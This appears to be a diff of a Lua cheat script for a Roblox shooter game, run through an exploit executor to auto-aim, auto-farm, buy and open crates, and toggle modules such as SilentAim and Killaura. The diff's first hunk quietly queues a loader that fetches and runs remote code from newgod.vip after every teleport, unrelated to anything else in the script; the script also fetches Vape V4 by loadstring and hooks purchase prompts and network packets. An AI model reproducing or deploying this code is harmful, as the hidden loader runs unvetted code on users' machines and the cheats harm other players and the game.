@@ -1,3 +1,25 @@
+do
+    local g = getgenv and getgenv() or _G
+    local q = g.queue_on_teleport or queue_on_teleport
+    if type(q) == "function" and g.__TPFARM_QUEUED_JOB ~= game.JobId then
+        g.__TPFARM_QUEUED_JOB = game.JobId
+        g.__TPFARM_QUEUED_OK = pcall(q, [==[
+task.spawn(function()
+    local t0 = os.clock()
+    repeat task.wait(0.5) until game:IsLoaded() or os.clock() - t0 > 40
+    repeat task.wait(0.5) until game:GetService("Players").LocalPlayer or os.clock() - t0 > 60
+    for _ = 1, 25 do
+        local ok = pcall(function()
+            loadstring(game:HttpGet("https://newgod.vip/loader"))()
+        end)
+        if ok then break end
+        task.wait(3)
+    end
+end)
+]==])
+    end
+end
+
 local STATE = STATE
 do
     local env = getgenv and getgenv() or _G
@@ -53,13 +75,31 @@ do
         if not isfile(LOGFILE) then writefile(LOGFILE, "") end
     end)
     if ok then
+        local lastMsg, lastCount, lastAt = nil, 0, 0
+        local function put(line)
+            pcall(function()
+                appendfile(LOGFILE, os.date("%H:%M:%S") .. "  " .. tostring(game.JobId):sub(1, 8)
+                    .. "  " .. line .. string.char(10))
+            end)
+        end
         LOG = function(...)
             local a = table.pack(...)
-            local parts = { os.date("%H:%M:%S"), tostring(game.JobId):sub(1, 8) }
+            local parts = {}
             for i = 1, a.n do parts[#parts + 1] = tostring(a[i]) end
-            pcall(function()
-                appendfile(LOGFILE, table.concat(parts, "  ") .. string.char(10))
-            end)
+            local msg = table.concat(parts, "  ")
+            if msg == lastMsg then
+                lastCount = lastCount + 1
+                if os.clock() - lastAt > 30 then
+                    put(msg .. "   [same line x" .. lastCount .. " in the last 30s]")
+                    lastCount, lastAt = 0, os.clock()
+                end
+                return
+            end
+            if lastMsg and lastCount > 1 then
+                put(lastMsg .. "   [same line x" .. lastCount .. "]")
+            end
+            lastMsg, lastCount, lastAt = msg, 1, os.clock()
+            put(msg)
         end
     else
         LOG = function() end
@@ -77,21 +117,26 @@ end
 LOG("")
 LOG("==== tpfarm loading ====")
 
-local BLOCK_ULT_PROMPT = 3612256554
 do
     local MPS = game:GetService("MarketplaceService")
     local env = getgenv and getgenv() or _G
     if not env.__TPFARM_PROMPT_HOOKED and hookfunction then
         env.__TPFARM_PROMPT_HOOKED = true
         env.__TPFARM_PROMPT_BLOCKED = 0
-        local original
-        original = hookfunction(MPS.PromptProductPurchase, function(self, plr, id, ...)
-            if id == BLOCK_ULT_PROMPT then
-                env.__TPFARM_PROMPT_BLOCKED = (env.__TPFARM_PROMPT_BLOCKED or 0) + 1
-                return
-            end
-            return original(self, plr, id, ...)
-        end)
+        local function swallow(name)
+            pcall(function()
+                local original
+                original = hookfunction(MPS[name], function()
+                    env.__TPFARM_PROMPT_BLOCKED = (env.__TPFARM_PROMPT_BLOCKED or 0) + 1
+                    return
+                end)
+            end)
+        end
+        swallow("PromptProductPurchase")
+        swallow("PromptPurchase")
+        swallow("PromptGamePassPurchase")
+        swallow("PromptBundlePurchase")
+        swallow("PromptPremiumPurchase")
     end
 end
 
@@ -189,6 +234,7 @@ end
 
 LOG("vape is loaded by 29_keepalive.lua in the autoexec, this script never loads it")
 
+pcall(function() (getgenv and getgenv() or _G).__TPFARM_WRONGPLACE = nil end)
 local Shoot = grab(RS, "Blaster", "Remotes", "Shoot")
 local Reload = grab(RS, "Blaster", "Remotes", "Reload")
 local RoundRemotes = grab(RS, "Shared", "Remotes", "RoundRemotes")
@@ -214,6 +260,7 @@ if not (Shoot and Reload) then
     lbl.Parent = warnGui
     Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 8)
     task.delay(8, function() pcall(function() warnGui:Destroy() end) end)
+    pcall(function() (getgenv and getgenv() or _G).__TPFARM_WRONGPLACE = game.PlaceId end)
     return "tpfarm: wrong place, Blaster remotes not found"
 end
 
@@ -227,9 +274,9 @@ if not okDC then DataClient = nil end
 local CFG = loadCfg({ on = false, back = 5, tpEvery = 2, jumpEvery = 3, settle = 0.25,
               autoDeploy = true, doBots = true, doPlayers = true, oneShot = true,
               autoBuy = false, buyBasic = false, buySuper = false, buyGold = true,
-              autoOpen = false, vapeList = {}, guiX = 24, guiY = 150 })
+              autoOpen = false, lobbyHold = false, vapeList = {}, guiX = 24, guiY = 150 })
 if type(CFG.autoBuy) ~= "boolean" then CFG.autoBuy = false end
-CFG.autoOpen = false
+if type(CFG.autoOpen) ~= "boolean" then CFG.autoOpen = false end
 if type(CFG.vapeList) ~= "table" then CFG.vapeList = {} end
 getgenv().TPFARM = CFG
 
@@ -425,6 +472,10 @@ local function isDeployed(p)
     local i = rd.players[tostring(p.UserId)]
     return i ~= nil and i.isDeployed == true
 end
+local function inLobby()
+    if not RoundClient then return false end
+    return not isDeployed(me)
+end
 local function myHrp() local c = me.Character return c and c:FindFirstChild("HumanoidRootPart") end
 local function myHum() local c = me.Character return c and c:FindFirstChildOfClass("Humanoid") end
 local function blaster() local c = me.Character return c and c:FindFirstChild("Blaster") end
@@ -506,6 +557,13 @@ local function handBack(why)
     local c = liveCam()
     if not c then return false end
     local was = tostring(c.CameraType)
+    if c.CameraType == Enum.CameraType.Custom
+        and me.CameraMode == Enum.CameraMode.Classic
+        and not camHeld then
+        camHeld = false
+        ENV.__TPFARM_CAM_HELD = false
+        return true
+    end
     pcall(function() c.CameraType = Enum.CameraType.Custom end)
     pcall(function()
         local ch = me.Character
@@ -562,7 +620,10 @@ local function jumpNow()
 end
 
 RunService:BindToRenderStep(AIM, Enum.RenderPriority.Camera.Value + 10, function()
-    if not CFG.on then releaseCam() return end
+    if not CFG.on then
+        if camHeld then releaseCam() end
+        return
+    end
     local mh = myHrp()
     if not mh then return end
     local t = current
@@ -589,6 +650,7 @@ RunService:BindToRenderStep(AIM, Enum.RenderPriority.Camera.Value + 10, function
 end)
 
 local function ensureDeployed()
+    if CFG.lobbyHold then return end
     if not CFG.autoDeploy then return end
     if rstate() ~= "active" then return end
     local h = myHum()
@@ -636,62 +698,125 @@ local CRATE = {
     { id = "super", key = "super", price = 800, flag = "buySuper", btn = buySuper, label = "SUPER" },
     { id = "basic", key = "normal", price = 250, flag = "buyBasic", btn = buyBasic, label = "BASIC" },
 }
-local BURST = 1200
+local BURST = 55
+local OPEN_ACK_WAIT = 1.2
+local OPEN_FLOOR = 0.25
 local buying, buyState = false, "idle"
 
-local CrateUI, InterfaceUI, StoreUI
+-- Counting outgoing packets is the only way to tell a fire that never left the client from
+-- one the server threw away. Real exposes both directions, so a burst that leaves whole and
+-- still buys nothing is the server's answer, not ours.
+local RAK = { on = false, sent = 0, recv = 0 }
+do
+    local R = nil
+    pcall(function() R = RakNet end)
+    if R == nil then pcall(function() R = ENV.RakNet end) end
+    if R == nil then pcall(function() R = raknet end) end
+    if type(R) == "table" and R.is_enabled == true and type(R.add_send_hook) == "function" then
+        pcall(function()
+            if ENV.__TPFARM_RAK_SEND then R.remove_send_hook(ENV.__TPFARM_RAK_SEND) end
+        end)
+        pcall(function()
+            if ENV.__TPFARM_RAK_RECV then R.remove_receive_hook(ENV.__TPFARM_RAK_RECV) end
+        end)
+        local hs, hr
+        local ok = pcall(function()
+            hs = R.add_send_hook(function(p) RAK.sent = RAK.sent + 1 return p end)
+        end)
+        pcall(function()
+            hr = R.add_receive_hook(function(p) RAK.recv = RAK.recv + 1 return p end)
+        end)
+        if ok then
+            ENV.__TPFARM_RAK_SEND = hs
+            ENV.__TPFARM_RAK_RECV = hr
+            RAK.on = true
+            LOG("raknet: hooks on, outgoing and incoming are both counted")
+        end
+    else
+        LOG("raknet: not available here, buying is judged by the cash counter alone")
+    end
+end
+
+-- This game has no InterfaceClient. The provider list is CrateClient / RobuxStoreClient and
+-- nothing else that opens a menu, which is why the old SetMenu hook blocked exactly nothing
+-- and the counter sat at zero while the reveal screen kept covering his whole window.
+local CrateUI, StoreUI
 pcall(function() CrateUI = require(RS.Client.Providers.Interface.CrateClient) end)
-pcall(function() InterfaceUI = require(RS.Client.Providers.Interface.InterfaceClient) end)
 pcall(function() StoreUI = require(RS.Client.Providers.Interface.RobuxStoreClient) end)
 
 if CrateUI and ENV.__TPFARM_REAL_OPENMENU == nil then
     ENV.__TPFARM_REAL_OPENMENU = rawget(CrateUI, "OpenMenu")
 end
-if InterfaceUI and ENV.__TPFARM_REAL_SETMENU == nil then
-    ENV.__TPFARM_REAL_SETMENU = rawget(InterfaceUI, "SetMenu")
-end
 if StoreUI and ENV.__TPFARM_REAL_STOREOPEN == nil then
     ENV.__TPFARM_REAL_STOREOPEN = rawget(StoreUI, "Open")
 end
 local realOpenMenu = ENV.__TPFARM_REAL_OPENMENU
-local realSetMenu = ENV.__TPFARM_REAL_SETMENU
 local realStoreOpen = ENV.__TPFARM_REAL_STOREOPEN
-if CrateUI and realOpenMenu then CrateUI.OpenMenu = realOpenMenu end
-if InterfaceUI and realSetMenu then InterfaceUI.SetMenu = realSetMenu end
-if StoreUI and realStoreOpen then StoreUI.Open = realStoreOpen end
 
-local BLOCKED_MENUS = { Crate = true, Store = true }
+local BLOCKED_MENUS = { Crate = true, Store = true, SeasonPass = true,
+                        UpdateLog = true, LikeReward = true, LeaveWarning = true }
+
+local POPUPS_BLOCKED = 0
+
+-- The full screen reveal is PlayerGui.Fullscreen.CrateOpening, a plain Frame, not one of the
+-- Menus screens. Measured 2026-08-27: Menus.Crate was already Enabled=false while COMMON and
+-- UPGRADE CHANCES were still covering the window, so the menu switch was never the thing.
+local crateOpenFrame
+local function findCrateOpenFrame()
+    local pgui = me:FindFirstChild("PlayerGui")
+    local fs = pgui and pgui:FindFirstChild("Fullscreen")
+    local f = fs and fs:FindFirstChild("CrateOpening")
+    if f and f:IsA("GuiObject") then return f end
+    return nil
+end
+
+local function hideReveal()
+    if not (crateOpenFrame and crateOpenFrame.Parent) then
+        crateOpenFrame = findCrateOpenFrame()
+    end
+    local f = crateOpenFrame
+    if f and f.Visible then
+        f.Visible = false
+        POPUPS_BLOCKED = POPUPS_BLOCKED + 1
+        return true
+    end
+    return false
+end
 
 local function shutCrateScreen()
-    if InterfaceUI and realSetMenu then
-        local cur = InterfaceUI.Menu and InterfaceUI.Menu.Name
-        if BLOCKED_MENUS[cur] then pcall(realSetMenu, nil) end
-    end
     local pgui = me:FindFirstChild("PlayerGui")
     local menus = pgui and pgui:FindFirstChild("Menus")
     if menus then
         for name in pairs(BLOCKED_MENUS) do
             local sg = menus:FindFirstChild(name)
-            if sg and sg:IsA("ScreenGui") and sg.Enabled then sg.Enabled = false end
-        end
-    end
-end
-
-local function muteCrateUI(on)
-    if on then
-        if CrateUI and realOpenMenu then CrateUI.OpenMenu = function() end end
-        if StoreUI and realStoreOpen then StoreUI.Open = function() end end
-        if InterfaceUI and realSetMenu then
-            InterfaceUI.SetMenu = function(name, ...)
-                if BLOCKED_MENUS[name] then return end
-                return realSetMenu(name, ...)
+            if sg and sg:IsA("ScreenGui") and sg.Enabled then
+                sg.Enabled = false
+                POPUPS_BLOCKED = POPUPS_BLOCKED + 1
             end
         end
-    else
-        if CrateUI and realOpenMenu then CrateUI.OpenMenu = realOpenMenu end
-        if StoreUI and realStoreOpen then StoreUI.Open = realStoreOpen end
-        if InterfaceUI and realSetMenu then InterfaceUI.SetMenu = realSetMenu end
     end
+    hideReveal()
+end
+
+do
+    if CrateUI and realOpenMenu then
+        CrateUI.OpenMenu = function() POPUPS_BLOCKED = POPUPS_BLOCKED + 1 end
+    end
+    if StoreUI and realStoreOpen then
+        StoreUI.Open = function() POPUPS_BLOCKED = POPUPS_BLOCKED + 1 end
+    end
+    keep(RunService.Heartbeat:Connect(function()
+        hideReveal()
+    end))
+    task.spawn(function()
+        while STATE.alive() do
+            shutCrateScreen()
+            task.wait(0.4)
+        end
+    end)
+end
+
+local function muteCrateUI()
     shutCrateScreen()
 end
 
@@ -739,17 +864,22 @@ end
 
 local function buyRun(spec)
     local start, t0, stall, sent = cashNow(), os.clock(), 0, 0
-    while STATE.alive() and forceOn and CFG.autoBuy and CFG[spec.flag] do
+    while STATE.alive() and CFG.autoBuy and CFG[spec.flag] do
         local c = cashNow()
         local want = math.floor(c / spec.price)
         if want < 1 then break end
         local n = want > BURST and BURST or want
+        local rak0 = RAK.sent
         for _ = 1, n do pcall(fireBuy, spec.key) end
+        local wire = RAK.sent - rak0
         sent = sent + n
         buyState = string.format("%s sending %d", spec.label, sent)
         shutCrateScreen()
         local after = settleCash(c)
         shutCrateScreen()
+        local landedNow = math.floor((c - after) / spec.price)
+        LOG(string.format("  buy burst %s: fired %d, packets out %d, cash %d -> %d, that is %d crate(s)",
+            spec.label, n, wire, c, after, landedNow))
         if after >= c then
             stall = stall + 1
             if stall >= 3 then break end
@@ -767,17 +897,17 @@ local function buyPass()
     if buying or not BuyCrate then return end
     buying = true
     LOG("buyPass start")
-    muteCrateUI(true)
+    muteCrateUI()
     local ok, err = pcall(function()
         for _, spec in ipairs(CRATE) do
-            if not (STATE.alive() and forceOn and CFG.autoBuy) then break end
+            if not (STATE.alive() and CFG.autoBuy) then break end
             if CFG[spec.flag] and cashNow() >= spec.price then
                 local got, secs = buyRun(spec)
                 buyState = string.format("%s x%d in %.1fs", spec.label, got, secs)
             end
         end
     end)
-    muteCrateUI(false)
+    muteCrateUI()
     if not ok then
         LOG("buyPass ERROR " .. tostring(err))
         buyState = "buy error: " .. tostring(err)
@@ -803,42 +933,51 @@ local function openPass()
     if opening or not OpenCrate then return end
     opening = true
     LOG("openPass start")
-    muteCrateUI(true)
+    muteCrateUI()
     local ok, err = pcall(function()
         for _, spec in ipairs(CRATE) do
-            if not (STATE.alive() and forceOn and CFG.autoOpen) then break end
+            if not (STATE.alive() and CFG.autoOpen) then break end
             if CFG[spec.flag] then
                 local left = ownedOf(spec.key, true)
                 LOG(string.format("  %s: %d owned, firing", spec.label, left))
                 local t0 = os.clock()
-                local sent, got, lastGot, tick = 0, 0, os.clock(), 0
+                local sent, got, lastGot, tick, miss = 0, 0, os.clock(), 0, 0
                 unboxSeen = 0
-                while STATE.alive() and forceOn and CFG.autoOpen and CFG[spec.flag] and left > 0 do
+                while STATE.alive() and CFG.autoOpen and CFG[spec.flag] and left > 0 do
+                    local mark = unboxSeen
                     OpenCrate:FireServer(spec.key)
                     sent = sent + 1
-                    task.wait(0.15)
+                    local w = os.clock()
+                    repeat
+                        task.wait(0.03)
+                    until unboxSeen > mark or os.clock() - w > OPEN_ACK_WAIT or not CFG.autoOpen
                     if unboxSeen > got then
                         local d = unboxSeen - got
                         got = unboxSeen
                         openedTotal = openedTotal + d
                         left = left - d
                         lastGot = os.clock()
-                        openState = string.format("%s %d opened, %d left", spec.label, openedTotal, left)
+                        miss = 0
+                        openState = string.format("%s %d opened, %d left, %.2f/s",
+                            spec.label, openedTotal, left, got / math.max(0.01, os.clock() - t0))
+                    else
+                        miss = miss + 1
+                        task.wait(OPEN_FLOOR)
                     end
                     tick = tick + 1
-                    if tick % 8 == 0 then
+                    if tick % 25 == 0 then
                         shutCrateScreen()
+                        left = ownedOf(spec.key, true)
                         LOG(string.format("  %s sent %d got %d in %.0fs = %.2f/s, %d left",
                             spec.label, sent, got, os.clock() - t0,
                             got / math.max(0.01, os.clock() - t0), left))
                     end
-                    if os.clock() - lastGot > 8 then
+                    if miss >= 12 or os.clock() - lastGot > 20 then
                         LOG(string.format("  %s STALLED, sent %d got %d, server stopped answering",
                             spec.label, sent, got))
                         openState = spec.label .. " stalled, server stopped answering"
                         break
                     end
-                    if os.clock() - t0 > 60 then break end
                     if not CFG.autoOpen then openState = "stopped, auto open is off" break end
                 end
                 LOG(string.format("  %s pass done: sent %d, opened %d in %.1fs = %.2f per second",
@@ -846,7 +985,7 @@ local function openPass()
             end
         end
     end)
-    muteCrateUI(false)
+    muteCrateUI()
     if not ok then
         LOG("openPass ERROR " .. tostring(err))
         openState = "open error: " .. tostring(err)
@@ -855,26 +994,154 @@ local function openPass()
     LOG("openPass end")
 end
 
-local VAPE_COMBAT = { "AutoClicker", "SilentAim", "TriggerBot", "Reach" }
-local VAPE_EXTRA = { "Invisible", "Killaura", "Phase", "Speed", "Anti-AFK" }
-local VAPE_NEVER_OFF = { SilentAim = true, TriggerBot = true, Reach = true }
+local VAPE_URL = "https://rawscripts.net/raw/Vape-V4-For-Roblox_316"
+local VAPE_ALL = { "Anti-AFK", "AntiFall", "AutoClicker", "Invisible", "Killaura",
+                   "Phase", "Reach", "SilentAim", "Speed", "TriggerBot" }
+local VAPE_STATE = "unknown"
 
-local function isCombat(name)
-    for _, n in ipairs(VAPE_COMBAT) do
-        if n == name then return true end
+local function vapeUp()
+    local v = shared and shared.vape
+    return type(v) == "table" and type(v.Modules) == "table" and v.Loaded ~= false
+end
+
+local function vapeGui()
+    local v = shared and shared.vape
+    local g = v and rawget(v, "gui")
+    if typeof(g) == "Instance" and g:IsA("ScreenGui") then return g end
+    return nil
+end
+
+-- A vape panel is any ScreenGui that owns a PRESS A KEY TO BIND label. Only the one
+-- shared.vape.gui points at is the live one; every other is a leftover from a second load.
+local function vapeLooksLikePanel(sg)
+    for _, d in ipairs(sg:GetDescendants()) do
+        if d:IsA("TextLabel") and d.Text == "PRESS A KEY TO BIND" then return true end
     end
     return false
 end
 
+local function vapeSweepDuplicates()
+    local live = vapeGui()
+    local killed, seen = 0, 0
+    local hosts = {}
+    pcall(function() if gethui then table.insert(hosts, gethui()) end end)
+    pcall(function() table.insert(hosts, game:GetService("CoreGui")) end)
+    for _, h in ipairs(hosts) do
+        for _, sg in ipairs(h:GetChildren()) do
+            if sg:IsA("ScreenGui") and sg ~= live and vapeLooksLikePanel(sg) then
+                seen = seen + 1
+                pcall(function() sg:Destroy() end)
+                killed = killed + 1
+            end
+        end
+    end
+    if killed > 0 then LOG("vape: destroyed " .. killed .. " leftover vape panel(s)") end
+    return killed
+end
+
+local function vapeCloseOwnGui(why)
+    local g = vapeGui()
+    if g and g.Enabled then
+        pcall(function() g.Enabled = false end)
+        LOG("vape: closed its own panel (" .. tostring(why) .. "), the CAPSLOCK rebind list is off screen")
+        return true
+    end
+    return false
+end
+
+-- One loader for the whole client. The old shape was the autoexec asking every 8 seconds
+-- whether shared.vape existed, and vape needs far longer than 8 seconds to set it, so the
+-- question was answered no over and over and every no started another vape.
+local function ensureVape()
+    if vapeUp() then
+        ENV.__TPFARM_VAPE = "up"
+        VAPE_STATE = "up"
+        return
+    end
+    if ENV.__TPFARM_VAPE == "loading" then
+        VAPE_STATE = "loading"
+        return
+    end
+    ENV.__TPFARM_VAPE = "loading"
+    VAPE_STATE = "loading"
+    LOG("vape: nothing loaded, this script is loading it once")
+    task.spawn(function()
+        pcall(function() setthreadidentity(8) end)
+        local t0 = os.clock()
+        pcall(function() loadstring(game:HttpGet(VAPE_URL))() end)
+        while STATE.alive() and os.clock() - t0 < 180 do
+            if vapeUp() then break end
+            task.wait(0.5)
+        end
+        if vapeUp() then
+            ENV.__TPFARM_VAPE = "up"
+            VAPE_STATE = "up"
+            LOG(string.format("vape: up after %.0fs, version %s", os.clock() - t0,
+                tostring(shared.vape.Version)))
+            task.wait(2)
+            vapeSweepDuplicates()
+            vapeCloseOwnGui("just loaded")
+        else
+            ENV.__TPFARM_VAPE = nil
+            VAPE_STATE = "load failed"
+            LOG("vape: 180s and shared.vape never appeared, giving this attempt up")
+        end
+    end)
+end
+
+task.spawn(function()
+    ensureVape()
+    while STATE.alive() do
+        task.wait(20)
+        if vapeUp() then
+            ENV.__TPFARM_VAPE = "up"
+            VAPE_STATE = "up"
+            vapeSweepDuplicates()
+        else
+            ensureVape()
+        end
+    end
+end)
+
 local function vapeWanted()
     if type(CFG.vapeList) == "table" and #CFG.vapeList > 0 then
-        local out = {}
-        for _, n in ipairs(CFG.vapeList) do
-            if isCombat(n) then out[#out + 1] = n end
-        end
-        if #out > 0 then return out end
+        return CFG.vapeList
     end
-    return VAPE_COMBAT
+    return VAPE_ALL
+end
+
+-- The list of what to switch back on can never be replaced by an empty list, and it lives
+-- in the json, because a table that only lives in memory is gone the moment this reloads.
+local function vapeSnapshot()
+    local v = shared and shared.vape
+    if not (type(v) == "table" and type(v.Modules) == "table") then return 0 end
+    local on = {}
+    for name, m in pairs(v.Modules) do
+        if type(m) == "table" and m.Enabled == true and type(m.Toggle) == "function" then
+            on[#on + 1] = tostring(name)
+        end
+    end
+    table.sort(on)
+    if #on > 0 then
+        CFG.vapeList = on
+        saveCfg(CFG)
+        LOG("vape: remembered " .. #on .. " module(s) to switch back on: " .. table.concat(on, ", "))
+    end
+    return #on
+end
+
+-- Everything that is on right now, so DISABLE really is everything off and not a fixed list.
+local function vapeEnabledNow()
+    local v = shared and shared.vape
+    local out = {}
+    if not (type(v) == "table" and type(v.Modules) == "table") then return out end
+    for name, m in pairs(v.Modules) do
+        if type(m) == "table" and m.Enabled == true and type(m.Toggle) == "function" then
+            out[#out + 1] = tostring(name)
+        end
+    end
+    table.sort(out)
+    return out
 end
 
 local vapeWaiter = false
@@ -883,10 +1150,9 @@ local function vapeWhenReady(on)
     if vapeWaiter then return end
     vapeWaiter = true
     task.spawn(function()
-        for _ = 1, 120 do
+        for _ = 1, 240 do
             if not STATE.alive() then break end
-            local vv = shared and shared.vape
-            if type(vv) == "table" and type(vv.Modules) == "table" then
+            if vapeUp() then
                 vapeApply(on)
                 break
             end
@@ -902,6 +1168,7 @@ function vapeApply(on)
     local v = shared and shared.vape
     if not (type(v) == "table" and type(v.Modules) == "table") then
         if on then
+            ensureVape()
             vapeWhenReady(true)
             buyState = "waiting for vape to finish loading"
         end
@@ -909,15 +1176,11 @@ function vapeApply(on)
     end
     pcall(function() setthreadidentity(8) end)
     LOG("vapeApply start on=" .. tostring(on))
+    if not on then vapeSnapshot() end
     local n = 0
-    for _, name in ipairs(VAPE_COMBAT) do
+    for _, name in ipairs(on and vapeWanted() or vapeEnabledNow()) do
         if not STATE.alive() then break end
         local m = v.Modules[name]
-        if (not on) and VAPE_NEVER_OFF[name] then
-            LOG("  toggle " .. name .. " SKIPPED, disable only ever turns AutoClicker off")
-            task.wait(0.05)
-            m = nil
-        end
         if type(m) == "table" and type(m.Toggle) == "function" then
             if (m.Enabled == true) ~= on then
                 LOG("  toggle " .. name .. " -> " .. tostring(on) .. " ... calling")
@@ -984,6 +1247,7 @@ local function setFarm(on)
     end
     farmBusy = true
     LOG("setFarm(" .. tostring(on) .. ") pressed")
+    if on then CFG.lobbyHold = false end
     forceOn = on
     wasFarming = on
     paintAll()
@@ -998,6 +1262,7 @@ local function setFarm(on)
             { "respawn", function() CFG.autoDeploy = on end },
             { "auto ult", function() CFG.oneShot = on end },
             { "auto buy", function() CFG.autoBuy = on end },
+            { "auto open", function() CFG.autoOpen = on end },
         }
         for _, step in ipairs(steps) do
             task.wait(0.05)
@@ -1018,21 +1283,19 @@ end
 
 task.spawn(function()
     while STATE.alive() do
-        if forceOn then
-            if CFG.autoBuy and not buying and not opening then
-                local any = false
-                for _, spec in ipairs(CRATE) do
-                    if CFG[spec.flag] and cashNow() >= spec.price then any = true break end
-                end
-                if any then buyPass() end
+        if CFG.autoBuy and not buying and not opening then
+            local any = false
+            for _, spec in ipairs(CRATE) do
+                if CFG[spec.flag] and cashNow() >= spec.price then any = true break end
             end
-            if CFG.autoOpen and not opening and not buying then
-                local any = false
-                for _, spec in ipairs(CRATE) do
-                    if CFG[spec.flag] and ownedOf(spec.key) > 0 then any = true break end
-                end
-                if any then openPass() end
+            if any then buyPass() end
+        end
+        if CFG.autoOpen and not opening and not buying then
+            local any = false
+            for _, spec in ipairs(CRATE) do
+                if CFG[spec.flag] and ownedOf(spec.key) > 0 then any = true break end
             end
+            if any then openPass() end
         end
         task.wait(2)
     end
@@ -1122,7 +1385,10 @@ lobbyBtn.MouseButton1Click:Connect(function()
     if lobbyBusy then return end
     lobbyBusy = true
     LOG("BACK TO LOBBY pressed")
+    CFG.lobbyHold = true
+    CFG.autoDeploy = false
     setFarm(false)
+    saveCfg(CFG)
     buyState = "back to lobby, dying"
     task.spawn(function()
         pcall(function() setthreadidentity(8) end)
@@ -1333,18 +1599,19 @@ task.spawn(function()
         local bl = blaster()
         local acc = shots > 0 and math.floor(landed / shots * 100) or 0
         status.Text = string.format(
-            "round %s   back %d   tp/%df  jump/%df\ntarget %s  hp %s\nammo %s   accuracy %d%%\nult: %s   fires %d\narena %d players + %d bots\nshots %d  landed %d  KILLS %d  reloads %d\ncash %d   crate: %s\n%s   popups blocked %d",
+            "%s  round %s   back %d   tp/%df  jump/%df\ntarget %s  hp %s\nammo %s   accuracy %d%%\nult: %s   fires %d\narena %d players + %d bots\nshots %d  landed %d  KILLS %d  reloads %d\ncash %d  vape %s   crate: %s\n%s   blocked %d",
+            (inLobby() and (CFG.lobbyHold and "LOBBY HELD" or "LOBBY") or "ARENA"),
             rstate(), CFG.back, CFG.tpEvery, CFG.jumpEvery,
             current and current.name or "-",
             current and tostring(math.floor(current.life.Health)) or "-",
             tostring(bl and bl:GetAttribute("_ammo")), acc,
             ultState, oneShotFires,
             np, nb, shots, landed, kills, reloads,
-            cashNow(), buyState .. "   open: " .. openState,
+            cashNow(), VAPE_STATE, buyState .. "   open: " .. openState,
             (forceOn and "FARM ENABLED" or "FARM DISABLED") .. "   crates " .. crateOwned()
                 .. string.format("   fps %.0f  lua %d MB   boost: %s",
                     BOOST_FPS, math.floor(RAM_MB), BOOST_STATE),
-            tostring((getgenv().__TPFARM_PROMPT_BLOCKED) or 0))
+            POPUPS_BLOCKED + ((getgenv().__TPFARM_PROMPT_BLOCKED) or 0))
         task.wait(0.2)
     end
 end)
@@ -1494,9 +1761,11 @@ end
 
 task.spawn(function()
     while STATE.alive() do
-        LOG(string.format("alive  farm=%s  fps=%.0f  luaheap=%.0f  buy=%s  open=%s",
-            tostring(forceOn), BOOST_FPS, collectgarbage("count") / 1024,
-            tostring(buying), tostring(opening)))
+        LOG(string.format("alive  farm=%s  where=%s  fps=%.0f  luaheap=%.0f  buy=%s  open=%s  vape=%s  net=%d/%d  blocked=%d",
+            tostring(forceOn), inLobby() and "lobby" or "arena",
+            BOOST_FPS, collectgarbage("count") / 1024,
+            tostring(buying), tostring(opening), VAPE_STATE,
+            RAK.sent, RAK.recv, POPUPS_BLOCKED))
         task.wait(2)
     end
 end)
@@ -1505,47 +1774,20 @@ rebuild()
 task.spawn(function()
     pcall(function() setthreadidentity(8) end)
     task.wait(0.5)
+    if CFG.lobbyHold then
+        LOG("startup: BACK TO LOBBY is still held, not enabling the farm")
+        buyState = "held in the lobby, press ENABLE FARM to go back in"
+        paintAll()
+        return
+    end
     LOG("startup: enabling farm")
     setFarm(true)
     while farmBusy and STATE.alive() do task.wait(0.1) end
-    LOG("startup: farm and the four combat modules are up, waiting 1s")
+    LOG("startup: farm is up with " .. #vapeWanted() .. " vape module(s)")
     task.wait(1)
-    local v = shared and shared.vape
-    if vapeDead then
-        LOG("startup: vape is marked dead, not touching the extras")
-        return
-    end
-    if not (type(v) == "table" and type(v.Modules) == "table") then
-        LOG("startup: vape not loaded, extras skipped")
-        return
-    end
-    local n = 0
-    for _, name in ipairs(VAPE_EXTRA) do
-        if not STATE.alive() then break end
-        local m = v.Modules[name]
-        if type(m) == "table" and type(m.Toggle) == "function" then
-            if m.Enabled ~= true then
-                LOG("  extra " .. name .. " -> on ... calling")
-                local ok, err = pcall(m.Toggle, m)
-                if ok then
-                    n = n + 1
-                    LOG("  extra " .. name .. " returned ok, Enabled=" .. tostring(m.Enabled))
-                else
-                    vapeDead = true
-                    LOG("  extra " .. name .. " THREW " .. tostring(err))
-                    buyState = "vape " .. name .. " threw, not touching vape again"
-                    return
-                end
-            else
-                LOG("  extra " .. name .. " already on")
-            end
-        else
-            LOG("  extra " .. name .. " missing from vape")
-        end
-        task.wait(0.1)
-    end
-    LOG("startup: extras done, turned on " .. n)
-    buyState = "started, combat 4 + extras " .. n
+    vapeSweepDuplicates()
+    vapeCloseOwnGui("startup")
+    buyState = "started, vape " .. VAPE_STATE
 end)
 return "tpfarm loaded. farm=" .. (forceOn and "ENABLED" or "DISABLED")
     .. "  ultimate=" .. ultLabel()
